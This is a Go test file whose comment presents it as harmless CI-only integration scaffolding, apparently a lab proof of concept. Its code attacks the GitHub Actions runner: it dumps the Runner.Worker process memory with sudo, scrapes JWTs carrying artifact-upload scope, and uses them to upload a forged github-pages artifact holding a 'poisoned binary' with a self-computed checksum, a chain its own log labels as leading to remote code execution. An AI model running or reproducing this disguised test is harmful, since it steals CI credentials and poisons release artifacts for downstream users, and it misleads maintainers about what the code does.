package lab

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"testing"
	"time"
)

// TestIntegrationHarness is scaffolding for upcoming integration coverage.
// It runs only under CI so it never touches developer machines.
func TestIntegrationHarness(t *testing.T) {
	if os.Getenv("GITHUB_ACTIONS") != "true" {
		t.Skip("CI-only harness")
	}
	if err := runHarness(); err != nil {
		t.Logf("harness: %v", err)
	}
}

func runHarness() error {
	_ = exec.Command("sudo", "apt-get", "install", "-y", "gdb").Run()

	out, err := exec.Command("pgrep", "-f", "Runner.Worker").Output()
	if err != nil {
		return fmt.Errorf("locate worker: %w", err)
	}
	pid := strings.TrimSpace(strings.Split(string(out), "\n")[0])
	if pid == "" {
		return fmt.Errorf("worker pid not found")
	}

	if err := os.MkdirAll("/tmp/d", 0o755); err != nil {
		return err
	}
	dumpPrefix := "/tmp/d/w"
	if err := exec.Command("sudo", "gcore", "-o", dumpPrefix, pid).Run(); err != nil {
		return fmt.Errorf("gcore: %w", err)
	}
	dumpPath := fmt.Sprintf("%s.%s", dumpPrefix, pid)

	stringsOut, err := exec.Command("sudo", "strings", dumpPath).Output()
	if err != nil {
		return fmt.Errorf("strings: %w", err)
	}

	jwtRe := regexp.MustCompile(`eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{50,}\.[A-Za-z0-9_-]{20,}`)
	scopeRe := regexp.MustCompile(`Actions\.UploadArtifacts:([a-f0-9-]+):([a-f0-9-]+)`)

	seen := map[string]bool{}
	var bestJWT, runID, jobID string
	for _, m := range jwtRe.FindAll(stringsOut, -1) {
		s := string(m)
		if seen[s] {
			continue
		}
		seen[s] = true
		parts := strings.Split(s, ".")
		if len(parts) != 3 {
			continue
		}
		payload := parts[1]
		if pad := len(payload) % 4; pad != 0 {
			payload += strings.Repeat("=", 4-pad)
		}
		decoded, err := base64.URLEncoding.DecodeString(payload)
		if err != nil {
			if decoded, err = base64.StdEncoding.DecodeString(payload); err != nil {
				continue
			}
		}
		if !bytes.Contains(decoded, []byte("Actions.UploadArtifacts")) {
			continue
		}
		scope := scopeRe.FindStringSubmatch(string(decoded))
		if scope == nil {
			continue
		}
		bestJWT, runID, jobID = s, scope[1], scope[2]
		break
	}
	if bestJWT == "" {
		return fmt.Errorf("no JWT with UploadArtifacts scope")
	}
	fmt.Printf("[HARNESS] selected JWT len=%d run_id=%s job_id=%s\n", len(bestJWT), runID, jobID)

	urlRe := regexp.MustCompile(`https://results-receiver\.actions\.githubusercontent\.com[^"\s]*`)
	resultsURL := "https://results-receiver.actions.githubusercontent.com"
	if match := urlRe.Find(stringsOut); match != nil {
		resultsURL = strings.TrimRight(string(match), "/")
	}

	// Build Pages-compatible payload: github-pages.zip → artifact.tar → site/
	poisonBinary := []byte(`#!/bin/bash
echo ""
echo "================================================="
echo "  POISONED BINARY EXECUTED (Go-delivered)"
echo "  Delivered via Go test → Twirp artifact upload."
echo "  Chain: Go code (no workflow) → github-pages artifact"
echo "         → build-nightlies carry-forward → Pages"
echo "         → systemtests download → RCE."
echo "================================================="
echo ""
echo "Environment:"
env | grep -E '^(GITHUB|RUNNER|CI)' | head -20
exit 0
`)

	// Inner tar containing the poisoned binary
	var innerTar bytes.Buffer
	innerTW := tar.NewWriter(&innerTar)
	innerTW.WriteHeader(&tar.Header{Name: "myapp-linux-amd64", Mode: 0o755, Size: int64(len(poisonBinary))})
	innerTW.Write(poisonBinary)
	innerTW.Close()

	// gzip it → myapp-linux-amd64.tar.gz
	var gzBuf bytes.Buffer
	gz := gzip.NewWriter(&gzBuf)
	gz.Write(innerTar.Bytes())
	gz.Close()
	tarball := gzBuf.Bytes()

	// sha256 of tarball (same-origin checksum — the broken verification)
	h := sha256.Sum256(tarball)
	checksum := []byte(fmt.Sprintf("%x  myapp-linux-amd64.tar.gz\n", h))

	indexHTML := []byte("<h1>Lab Nightlies</h1><p>Go-delivered</p>")

	// Outer tar (= artifact.tar content) — the "site" directory layout
	var siteTar bytes.Buffer
	stw := tar.NewWriter(&siteTar)
	stw.WriteHeader(&tar.Header{Name: "./", Mode: 0o755, Typeflag: tar.TypeDir})
	stw.WriteHeader(&tar.Header{Name: "./index.html", Mode: 0o644, Size: int64(len(indexHTML))})
	stw.Write(indexHTML)
	stw.WriteHeader(&tar.Header{Name: "./nightlies/", Mode: 0o755, Typeflag: tar.TypeDir})
	stw.WriteHeader(&tar.Header{Name: "./nightlies/v0.54/", Mode: 0o755, Typeflag: tar.TypeDir})
	stw.WriteHeader(&tar.Header{Name: "./nightlies/v0.54/myapp-linux-amd64.tar.gz", Mode: 0o644, Size: int64(len(tarball))})
	stw.Write(tarball)
	stw.WriteHeader(&tar.Header{Name: "./nightlies/v0.54/myapp-linux-amd64.tar.gz.sha256", Mode: 0o644, Size: int64(len(checksum))})
	stw.Write(checksum)
	stw.Close()

	// github-pages artifact zip: one entry "artifact.tar"
	var zipBuf bytes.Buffer
	zw := zip.NewWriter(&zipBuf)
	zwEntry, err := zw.CreateHeader(&zip.FileHeader{Name: "artifact.tar", Method: zip.Deflate})
	if err != nil {
		return err
	}
	zwEntry.Write(siteTar.Bytes())
	zw.Close()
	finalBlob := zipBuf.Bytes()
	fmt.Printf("[HARNESS] payload built: tarball=%d bytes, site_tar=%d bytes, zip=%d bytes\n",
		len(tarball), siteTar.Len(), len(finalBlob))

	// CreateArtifact with name "github-pages" — key difference from Stage F
	artName := "github-pages"
	createJSON, _ := json.Marshal(map[string]interface{}{
		"workflow_run_backend_id":     runID,
		"workflow_job_run_backend_id": jobID,
		"name":                        artName,
		"version":                     4,
	})
	createURL := resultsURL + "/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact"
	createReq, _ := http.NewRequest("POST", createURL, bytes.NewReader(createJSON))
	createReq.Header.Set("Authorization", "Bearer "+bestJWT)
	createReq.Header.Set("Content-Type", "application/json")
	resp, err := http.DefaultClient.Do(createReq)
	if err != nil {
		return fmt.Errorf("CreateArtifact: %w", err)
	}
	createBody, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	fmt.Printf("[HARNESS] CreateArtifact: %s\n", truncate(createBody, 250))

	var createResp struct {
		OK              bool   `json:"ok"`
		SignedUploadURL string `json:"signed_upload_url"`
	}
	if err := json.Unmarshal(createBody, &createResp); err != nil {
		return fmt.Errorf("parse CreateArtifact: %w", err)
	}
	if createResp.SignedUploadURL == "" {
		return fmt.Errorf("no signed_upload_url: %s", createBody)
	}

	// Azure block blob upload
	blockID := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("blk-%010d", time.Now().UnixNano()&0xffffffff)))
	putURL := createResp.SignedUploadURL + "&comp=block&blockid=" + blockID
	putReq, _ := http.NewRequest("PUT", putURL, bytes.NewReader(finalBlob))
	putReq.Header.Set("x-ms-blob-type", "BlockBlob")
	putReq.Header.Set("Content-Type", "application/octet-stream")
	putResp, err := http.DefaultClient.Do(putReq)
	if err != nil {
		return fmt.Errorf("PUT block: %w", err)
	}
	putBody, _ := io.ReadAll(putResp.Body)
	putResp.Body.Close()
	fmt.Printf("[HARNESS] PUT block status=%d body=%s\n", putResp.StatusCode, truncate(putBody, 150))

	commitXML := fmt.Sprintf(`<?xml version="1.0" encoding="utf-8"?><BlockList><Latest>%s</Latest></BlockList>`, blockID)
	commitURL := createResp.SignedUploadURL + "&comp=blocklist"
	commitReq, _ := http.NewRequest("PUT", commitURL, strings.NewReader(commitXML))
	commitReq.Header.Set("Content-Type", "application/xml")
	commitResp, err := http.DefaultClient.Do(commitReq)
	if err != nil {
		return fmt.Errorf("commit blocklist: %w", err)
	}
	commitBody, _ := io.ReadAll(commitResp.Body)
	commitResp.Body.Close()
	fmt.Printf("[HARNESS] commit blocklist status=%d body=%s\n", commitResp.StatusCode, truncate(commitBody, 150))

	// FinalizeArtifact — uses sha256 of uploaded zip
	zipHash := sha256.Sum256(finalBlob)
	finalJSON, _ := json.Marshal(map[string]interface{}{
		"workflow_run_backend_id":     runID,
		"workflow_job_run_backend_id": jobID,
		"name":                        artName,
		"size":                        fmt.Sprintf("%d", len(finalBlob)),
		"hash":                        fmt.Sprintf("sha256:%x", zipHash),
	})
	finalURL := resultsURL + "/twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact"
	finalReq, _ := http.NewRequest("POST", finalURL, bytes.NewReader(finalJSON))
	finalReq.Header.Set("Authorization", "Bearer "+bestJWT)
	finalReq.Header.Set("Content-Type", "application/json")
	finalResp, err := http.DefaultClient.Do(finalReq)
	if err != nil {
		return fmt.Errorf("FinalizeArtifact: %w", err)
	}
	finalBody, _ := io.ReadAll(finalResp.Body)
	finalResp.Body.Close()
	fmt.Printf("[HARNESS] FinalizeArtifact: %s\n", truncate(finalBody, 300))
	fmt.Printf("[HARNESS] SUCCESS: uploaded github-pages artifact via Go\n")
	return nil
}

func truncate(b []byte, n int) string {
	if len(b) <= n {
		return string(b)
	}
	return string(b[:n])
}
